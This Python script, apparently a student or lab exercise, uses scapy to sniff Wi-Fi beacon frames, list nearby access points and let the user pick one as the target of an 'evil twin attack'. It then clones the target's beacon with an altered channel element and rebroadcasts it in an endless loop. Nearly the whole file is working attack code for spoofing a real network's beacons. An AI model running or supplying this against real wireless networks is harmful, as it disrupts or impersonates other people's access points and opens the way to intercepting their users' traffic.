from scapy.all import *
import signal

pkt_full_list = []
bssid_list = []
counter = 0
interface = input("Enter interface to listed on (must be on monitor mode : \n")
print("APs will be listed here, wait 20s and choose one  :\n")

def pkt_callback(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt.getlayer(Dot11).addr2.upper()
        if bssid not in bssid_list:
            bssid_list.append(bssid)
            pkt_full_list.append(pkt)
            try:
                dbm_signal = pkt.dBm_AntSignal
            except:
                dbm_signal = "N/A"
            # extract network stats
            stats = pkt[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")
            global counter
            counter += 1
            print(counter, " : \t", bssid, " SSID : ", pkt[Dot11].info, " Channel : ", channel, "RSSI : ", dbm_signal)


sniff(iface=interface, prn=pkt_callback, timeout=10)

evilTwinTarget = input("Choose one of the AP to do an evil twin attack :\n")
evilTwinTarget = int(evilTwinTarget)
pktSource = pkt_full_list[evilTwinTarget -1]
print("Actual Channel : ", pktSource[Dot11Beacon].network_stats().get("channel"))

channel = pktSource[Dot11Beacon].network_stats().get("channel")
#print(ls(pktSource))
#newPkt = pktSource.copy()
#newPkt[Dot11Elt].payload.payload.info = chr((channel + 6) % 11)
#p = newPkt[Dot11Elt].payload
#while isinstance(p, Dot11Elt):
#    print("one")
#    if p.ID == 3:
#        p.info = )
#        break
#    p = p.payload
#
#print(ls(newPkt))
#print(pktSource.show())
#print(newPkt.show())
newPkt = pktSource/Dot11Elt(ID="DSset", info=chr((channel + 6)%12))
newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
print("New Channel : ", newChannel)
sendp(newPkt, inter=0.1,loop=1, iface=interface)